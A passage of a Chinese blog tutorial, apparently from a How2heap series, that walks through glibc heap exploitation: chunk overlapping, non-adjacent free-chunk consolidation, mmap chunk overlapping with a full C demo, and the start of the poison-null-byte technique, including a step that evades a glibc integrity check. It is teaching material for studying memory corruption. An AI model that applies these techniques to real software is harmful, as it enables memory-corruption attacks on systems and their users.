src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-37.png#clientId=u347f053a-7aac-4&from=paste&height=317&id=u23dad15b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=634&originWidth=1086&originalType=binary&size=790782&status=done&style=none&taskId=u626bb9d4-b66b-42c2-b5c2-89c7ae34f95&width=543" alt="image.png"><br>然后我们 free 掉 p2,<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-38.png#clientId=u347f053a-7aac-4&from=paste&height=467&id=u4b4ea171&margin=%5Bobject%20Object%5D&name=image.png&originHeight=934&originWidth=1317&originalType=binary&size=1219380&status=done&style=none&taskId=ub3ae0add-f74d-4bd2-907f-bb40aa2f23e&width=658.5" alt="image.png"><br>发现它被加入到 unsortedbin 链表中<br>现在让我们模拟一个可以改写 p2.size 的溢出。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-39.png#clientId=u347f053a-7aac-4&from=paste&height=195&id=u4a17cb7e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=389&originWidth=1183&originalType=binary&size=296512&status=done&style=none&taskId=u21b36095-9ef1-43aa-8f8c-4ff6d145fa7&width=591.5" alt="image.png"><br>对于我们这个例子来讲三个标志位影响不是很大，但是为了保持堆的稳定性，还是不要随意改动。<br>至少我们要确保 pre_in_use 为 true，不要让 p1 被误认为被 free 了。<br>我们将 p2 的 size 改写为 0x181，之后的 malloc 就会返回给我们一个 0x178（可使用大小）的堆块。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-40.png#clientId=u347f053a-7aac-4&from=paste&height=447&id=u465f6ccd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=893&originWidth=1307&originalType=binary&size=1031294&status=done&style=none&taskId=ud4c7216b-d77c-4f1d-a866-aeadd12ac7a&width=653.5" alt="image.png"><br>返回给 p4 的地址就是原来 p2 的，而且 p4 中包含了还没被 free 的 p3。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-41.png#clientId=u347f053a-7aac-4&from=paste&height=397&id=u874ea1cc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=793&originWidth=1141&originalType=binary&size=553464&status=done&style=none&taskId=ucd76f966-66ff-412b-910e-f7793e9b391&width=570.5" alt="image.png"><br>能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时使用的各种宏。<br>在 ptmalloc 中，获取 chunk 块大小的操作如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* Get size, ignoring use bits */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span><br><br><span class="hljs-comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span><br></code></pre></td></tr></table></figure><p>一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分。在 ptmalloc 中，获取下一 chunk 块地址的操作如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* Ptr to next physical malloc_chunk. */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span><br></code></pre></td></tr></table></figure><p>即使用当前块指针加上当前块大小。在 ptmalloc 中，获取前一个 chunk 信息的操作如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span><br><br><span class="hljs-comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span><br></code></pre></td></tr></table></figure><p>即通过 malloc_chunk-&gt;prev_size 获取前一块大小，然后使用本 chunk 地址减去所得大小。<br>在 ptmalloc，判断当前 chunk 是否是 use 状态的操作如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> inuse(p)</span><br>    ((((mchunkptr)(((<span class="hljs-keyword">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)<br></code></pre></td></tr></table></figure><p>即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。<br>简而言之，chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的。<br>​</p><h1 id="overlapping-chunks-2-2-23"><a href="#overlapping-chunks-2-2-23" class="headerlink" title="overlapping_chunks_2-2.23"></a>overlapping_chunks_2-2.23</h1><p>这是一个简单的堆块重叠问题。<br>也被称为非相邻 free chunk 合并攻击。<br>首先 malloc 五个堆块：<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-42.png#clientId=u347f053a-7aac-4&from=paste&height=337&id=ub7194792&margin=%5Bobject%20Object%5D&name=image.png&originHeight=673&originWidth=1025&originalType=binary&size=589779&status=done&style=none&taskId=u03ef26d3-2974-4be4-84f7-dbebae19735&width=512.5" alt="image.png"><br>查看此时 heap<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-43.png#clientId=u347f053a-7aac-4&from=paste&height=322&id=u5270233b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=644&originWidth=680&originalType=binary&size=407793&status=done&style=none&taskId=ufa6339f8-57b8-46f0-bb5e-331d1df509f&width=340" alt="image.png"><br>输出</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp">chunk p1 from <span class="hljs-number">0x8007010</span> to <span class="hljs-number">0x80073f840</span><br>chunk p2 from <span class="hljs-number">0x8007400</span> to <span class="hljs-number">0x80077e841</span><br>chunk p3 from <span class="hljs-number">0x80077f0</span> to <span class="hljs-number">0x8007bd842</span><br>chunk p4 from <span class="hljs-number">0x8007be0</span> to <span class="hljs-number">0x8007fc843</span><br>chunk p5 from <span class="hljs-number">0x8007fd0</span> to <span class="hljs-number">0x80083b8</span><br></code></pre></td></tr></table></figure><p>然后填充赋值<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-44.png#clientId=u347f053a-7aac-4&from=paste&height=317&id=u105dc4ed&margin=%5Bobject%20Object%5D&name=image.png&originHeight=633&originWidth=982&originalType=binary&size=623807&status=done&style=none&taskId=u03d819ac-4cd2-486e-9a66-f124ca178ae&width=491" alt="image.png"><br>查看<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-45.png#clientId=u347f053a-7aac-4&from=paste&height=211&id=ue6c8de7d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=422&originWidth=1079&originalType=binary&size=445916&status=done&style=none&taskId=uce6ac4ca-4934-49e8-b21e-de027200e44&width=539.5" alt="image.png"><br>此时释放 p4，因为 p5 的存在所以 p4 不会被合并。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-46.png#clientId=u347f053a-7aac-4&from=paste&height=355&id=u797679fd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=710&originWidth=864&originalType=binary&size=604887&status=done&style=none&taskId=u2e8d5858-ac53-43e5-8f9a-78adba03a9b&width=432" alt="image.png"><br>然后我们在 p1 触发一个溢出，将 p2 的 size 改写成 p2 和 p3 大小的和。之后更新 presize 的时候是通过 p2 的地址加上 p2 的 size 来寻找的要修改的位置的，这里刚好就把 p4 头部的 presize 给改掉了。<br>之后 free(p2)的时候，分配器就会认为 p4 是下一个块。然后就会错误地将 p3 和 p2 合并。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-47.png#clientId=u347f053a-7aac-4&from=paste&height=477&id=u0779c540&margin=%5Bobject%20Object%5D&name=image.png&originHeight=954&originWidth=1095&originalType=binary&size=1034227&status=done&style=none&taskId=u5fc07d71-872d-4906-b822-27999e48bb6&width=547.5" alt="image.png"><br>这时候 malloc 一个大小 2000 的堆 p6&lt;0xbd1，返回给 p6 的地址就是 p2 的地址了，p6 内部也包含了未被 free 的 p3，又造成了 overlapping，修改 p6 内容即可修改 p3 内容。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-48.png#clientId=u347f053a-7aac-4&from=paste&height=461&id=ud4e0d6d0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=922&originWidth=1062&originalType=binary&size=593880&status=done&style=none&taskId=u9824bb34-39a1-41f9-8491-007382d7ca3&width=531" alt="image.png"><br>我们就可以用 p6 改写 p3 中的任何数据。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-49.png#clientId=u347f053a-7aac-4&from=paste&height=45&id=u8a504495&margin=%5Bobject%20Object%5D&name=image.png&originHeight=82&originWidth=385&originalType=binary&size=23281&status=done&style=none&taskId=ufc137763-aa72-417e-b0e3-19618068a5e&width=210.5" alt="image.png"><br>查看 p3 数据<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-50.png#clientId=u347f053a-7aac-4&from=paste&height=103&id=uff58dfc3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=206&originWidth=1821&originalType=binary&size=351670&status=done&style=none&taskId=u79b992fb-5ce9-4fef-a0c3-fa77c8646f3&width=910.5" alt="image.png"><br>修改之后<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-51.png#clientId=u347f053a-7aac-4&from=paste&height=373&id=ue02a99dc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=745&originWidth=1803&originalType=binary&size=1230606&status=done&style=none&taskId=u61a5de77-4b93-4de2-a164-2ca52e95455&width=901.5" alt="image.png"><br>与之前的 overlapping 相比，之前的是释放后修改 size，重新申请后覆盖了后面的堆；这个是先修改 size,使之大小覆盖了后面的堆，再释放后和已释放的大后个堆合并，包含了要覆盖的堆，重新申请后即可覆盖包含的堆的内容。</p><h1 id="mmap-overlapping-chunks-2-28"><a href="#mmap-overlapping-chunks-2-28" class="headerlink" title="mmap_overlapping_chunks-2.28"></a>mmap_overlapping_chunks-2.28</h1><p>代码翻译如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><br>    <span class="hljs-keyword">int</span>* ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;这种技术依然是 overlapping 但是针对的是比较大的 (通过 mmap 申请的)\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;分配大的 chunk 是比较特殊的，因为他们分配在单独的内存中，而不是普通的堆中\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;分配三个大小为 0x100000 的 chunk \n\n&quot;</span>);<br><br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>* top_ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100000</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第一个 mmap 块位于 Libc 上方： %p\n&quot;</span>,top_ptr);<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>* mmap_chunk_2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100000</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第二个 mmap 块位于 Libc 下方： %p\n&quot;</span>, mmap_chunk_2);<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>* mmap_chunk_3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100000</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第三个 mmap 块低于第二个 mmap 块: %p\n&quot;</span>, mmap_chunk_3);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n当前系统内存布局\n&quot;</span> \<br><span class="hljs-string">&quot;================================================\n&quot;</span> \<br><span class="hljs-string">&quot;running program\n&quot;</span> \<br><span class="hljs-string">&quot;heap\n&quot;</span> \<br><span class="hljs-string">&quot;....\n&quot;</span> \<br><span class="hljs-string">&quot;third mmap chunk\n&quot;</span> \<br><span class="hljs-string">&quot;second mmap chunk\n&quot;</span> \<br><span class="hljs-string">&quot;LibC\n&quot;</span> \<br><span class="hljs-string">&quot;....\n&quot;</span> \<br><span class="hljs-string">&quot;ld\n&quot;</span> \<br><span class="hljs-string">&quot;first mmap chunk\n&quot;</span><br><span class="hljs-string">&quot;===============================================\n\n&quot;</span> \<br>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第一个 mmap 的 prev_size: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="hljs-number">-2</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第三个 mmap 的 size: 0x%llx\n\n&quot;</span>, mmap_chunk_3[<span class="hljs-number">-1</span>]);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;假设有一个漏洞可以更改第三个 mmap 的大小，让他与第二个 mmap 块重叠\n&quot;</span>);<br>    mmap_chunk_3[<span class="hljs-number">-1</span>] = (<span class="hljs-number">0xFFFFFFFFFD</span> &amp; mmap_chunk_3[<span class="hljs-number">-1</span>]) + (<span class="hljs-number">0xFFFFFFFFFD</span> &amp; mmap_chunk_2[<span class="hljs-number">-1</span>]) | <span class="hljs-number">2</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;现在改掉的第三个 mmap 块的大小是: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="hljs-number">-1</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;free 掉第三个 mmap 块,\n\n&quot;</span>);<br><br>    <span class="hljs-built_in">free</span>(mmap_chunk_3);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;再分配一个很大的 mmap chunk\n&quot;</span>);<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>* overlapping_chunk = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300000</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;新申请的 Overlapped chunk 在: %p\n&quot;</span>, overlapping_chunk);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Overlapped chunk 的大小是: 0x%llx\n&quot;</span>, overlapping_chunk[<span class="hljs-number">-1</span>]);<br><br>    <span class="hljs-keyword">int</span> distance = mmap_chunk_2 - overlapping_chunk;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;新的堆块与第二个 mmap 块之间的距离: 0x%x\n&quot;</span>, distance);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;写入之前 mmap chunk2 的 index0 写的是: %llx\n&quot;</span>, mmap_chunk_2[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;编辑 overlapping chunk 的值\n&quot;</span>);<br>    overlapping_chunk[distance] = <span class="hljs-number">0x1122334455667788</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;写之后第二个 chunk 的值: 0x%llx\n&quot;</span>, mmap_chunk_2[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Overlapped chunk 的值: 0x%llx\n\n&quot;</span>, overlapping_chunk[distance]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;新块已与先前的块重叠\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>一开始申请了 3 个 0x100000 大小的堆<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-52.png#clientId=u38185df4-f4d6-4&from=paste&height=418&id=JCTtJ&margin=%5Bobject%20Object%5D&name=image.png&originHeight=835&originWidth=791&originalType=binary&size=677675&status=done&style=none&taskId=u9abe04a3-7168-40a6-9733-d55ff18f436&width=395.5" alt="image.png"><br>可以看到，普通堆区并没有分配的 0x100000 大小的堆。<br>然后查看相应的内存布局：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; n<br>The first mmap chunk goes directly above LibC: <span class="hljs-number">0x7fffff6a0010</span><br>The second mmap chunk goes below LibC: <span class="hljs-number">0x7fffff520010</span><br>The third mmap chunk goes below the second mmap chunk: <span class="hljs-number">0x7ffffef20010</span><br>pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x7fffff6a0000</span><br><span class="hljs-number">0x7fffff6a0000</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000101002</span><br><span class="hljs-number">0x7fffff6a0010</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffff6a0020</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffff6a0030</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffff6a0040</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x7fffff520000</span><br><span class="hljs-number">0x7fffff520000</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000101002</span><br><span class="hljs-number">0x7fffff520010</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffff520020</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffff520030</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffff520040</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x7ffffef20000</span><br><span class="hljs-number">0x7ffffef20000</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000101002</span><br><span class="hljs-number">0x7ffffef20010</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffffef20020</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffffef20030</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffffef20040</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p>然后把第三个的 size 改成 0x202002<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-53.png#clientId=u38185df4-f4d6-4&from=paste&height=309&id=njK7W&margin=%5Bobject%20Object%5D&name=image.png&originHeight=618&originWidth=1017&originalType=binary&size=646248&status=done&style=none&taskId=u334e294b-3df8-4042-80a0-c97fe1330ba&width=508.5" alt="image.png"><br>free 掉第三个，然后再去 malloc(0x300000)<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-54.png#clientId=u38185df4-f4d6-4&from=paste&height=32&id=XX3vY&margin=%5Bobject%20Object%5D&name=image.png&originHeight=63&originWidth=582&originalType=binary&size=44129&status=done&style=none&taskId=u7f6741db-376b-47c4-8b1a-3c71138b5fb&width=291" alt="image.png"><br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-55.png#clientId=u38185df4-f4d6-4&from=paste&height=31&id=JApc7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=62&originWidth=559&originalType=binary&size=46123&status=done&style=none&taskId=u3a66a5c0-d5c7-442f-9723-717b01d968d&width=279.5" alt="image.png"><br>新块距离第二个 mmap 块 0x42000<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-56.png#clientId=u38185df4-f4d6-4&from=paste&height=32&id=EofbB&margin=%5Bobject%20Object%5D&name=image.png&originHeight=63&originWidth=886&originalType=binary&size=55992&status=done&style=none&taskId=ude624104-d595-499b-90f6-482b630f2ba&width=443" alt="image.png"><br>写入前 mmap 块 2 的索引 0 的值：0<br>写入后：<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-57.png#clientId=u38185df4-f4d6-4&from=paste&height=305&id=OfhSX&margin=%5Bobject%20Object%5D&name=image.png&originHeight=610&originWidth=1033&originalType=binary&size=694967&status=done&style=none&taskId=u876b92d0-802b-4c31-8f55-072f7bb7b26&width=516.5" alt="image.png"><br>这样通过对新创建的堆块进行写操作就可以覆盖掉原本第二个那里的数据。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-58.png#clientId=u38185df4-f4d6-4&from=paste&height=469&id=nhwuf&margin=%5Bobject%20Object%5D&name=image.png&originHeight=938&originWidth=875&originalType=binary&size=878998&status=done&style=none&taskId=u206739db-6236-4085-942e-83ed57c6cd1&width=437.5" alt="image.png"></p><h1 id="poison-null-byte-2-23"><a href="#poison-null-byte-2-23" class="headerlink" title="poison_null_byte-2.23"></a>poison_null_byte-2.23</h1><p><strong>翻译：</strong><br>这个技术可被用于当可以被 malloc 的区域（也就是 heap 区域）存在一个单字节溢出漏洞的时候。<br>我们先分配 0x100 个字节的内存，代号’a’。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-59.png#clientId=u347f053a-7aac-4&from=paste&height=301&id=u5332779a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=601&originWidth=1052&originalType=binary&size=407596&status=done&style=none&taskId=u9d6172d7-16fa-44c2-aa70-87ac6d04b53&width=526" alt="image.png"><br>如果我们想要去溢出 a 的话，我们需要知道它的实际大小（因为空间复用的存在），在我的机器上是 0x108。<br>为什么是 0x108 呢，是因为所以 chunk 的头部需要占用 0x10 字节，但是 chunk 可以使用下一个 chunk 头部的 prev_size 位，就节省了 0x8 字节，所以最后是占用了 0x108 字节。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-60.png#clientId=u347f053a-7aac-4&from=paste&height=289&id=u8b4851bd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=577&originWidth=1365&originalType=binary&size=728992&status=done&style=none&taskId=u63a5e533-4198-4fbe-a191-c2dca5db548&width=682.5" alt="image.png"><br>然后接着我们分配 0x200 个字节，代号’b’。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-61.png#clientId=u347f053a-7aac-4&from=paste&height=309&id=ue93ab3d7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=617&originWidth=1148&originalType=binary&size=649735&status=done&style=none&taskId=u9dc10b62-3b11-496b-95de-9caf3992412&width=574" alt="image.png"><br>此时堆内存布局如下：<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-62.png#clientId=u347f053a-7aac-4&from=paste&height=148&id=uc5e70fd3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=295&originWidth=538&originalType=binary&size=159216&status=done&style=none&taskId=u63231e7b-2f8d-4edc-a4fc-2f82a057732&width=269" alt="image.png"><br>再分配 0x100 个字节，代号’c’。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-63.png#clientId=u347f053a-7aac-4&from=paste&height=296&id=u423519cb&margin=%5Bobject%20Object%5D&name=image.png&originHeight=591&originWidth=1133&originalType=binary&size=405738&status=done&style=none&taskId=u94a732ca-f9f8-4ab6-84f2-7db0ec08c52&width=566.5" alt="image.png"><br>然后分配一个 0x100 字节的 barrier 在 0x8008440，以便在释放时 c 不会与顶部块合并（这个障碍并不是绝对必要的，但是可以让事情变得不那么混乱）<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-64.png#clientId=u347f053a-7aac-4&from=paste&height=267&id=ub82ff069&margin=%5Bobject%20Object%5D&name=image.png&originHeight=534&originWidth=510&originalType=binary&size=250039&status=done&style=none&taskId=ud073f0fb-3f9f-4b25-9808-51e3b549156&width=255" alt="image.png"><br>在新版 glibc 环境下，我们需要在 b 内部更新 size 来逃避检测 <strong>‘chunksize(P) != prev_size (next_chunk(P))’</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">*(<span class="hljs-keyword">size_t</span>*)(b+<span class="hljs-number">0x1f0</span>) = <span class="hljs-number">0x200</span>;<br><span class="hljs-built_in">free</span>(b)<br></code></pre></td></tr></table></figure><p><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-65.png#clientId=u347f053a-7aac-4&from=paste&height=289&id=uc80f2690&margin=%5Bobject%20Object%5D&name=image.png&originHeight=578&originWidth=685&originalType=binary&size=374695&status=done&style=none&taskId=u0671d3d9-a34a-469a-803d-96d98691d0d&width=342.5" alt="image.png"><br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-66.png#clientId=u347f053a-7aac-4&from=paste&height=28&id=u625cb874&margin=%5Bobject%20Object%5D&name=image.png&originHeight=56&originWidth=453&originalType=binary&size=23547&status=done&style=none&taskId=u4744f654-460a-4710-984d-040fd67656f&width=226.5" alt="image.png"><br>此时堆内存布局如下：<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-67.png#clientId=u347f053a-7aac-4&from=paste&height=151&id=u9e500445&margin=%5Bobject%20Object%5D&name=image.png&originHeight=301&originWidth=542&originalType=binary&size=122557&status=done&style=none&taskId=u129e444d-eeb5-4bda-a8a7-57a90e3829e&width=271" alt="image.png"></p><p>我们在 a 实现一个单字节的 null byte 溢出。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-68.png#clientId=u347f053a-7aac-4&from=paste&height=296&id=u14eaae63&margin=%5Bobject%20Object%5D&name=image.png&originHeight=592&originWidth=1095&originalType=binary&size=548441&status=done&style=none&taskId=ubb192e74-9239-455a-a70e-f3635c1e1cf&width=547.5" alt="image.png"><br>可以看到 b 的 size 变成了 0x200<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-69.png#clientId=u347f053a-7aac-4&from=paste&height=196&id=udad05044&margin=%5Bobject%20Object%5D&name=image.png&originHeight=392&originWidth=560&originalType=binary&size=215629&status=done&style=none&taskId=u54d31539-3a17-4293-b8d9-4d46d24dc77&width=280" alt="image.png"><br><img 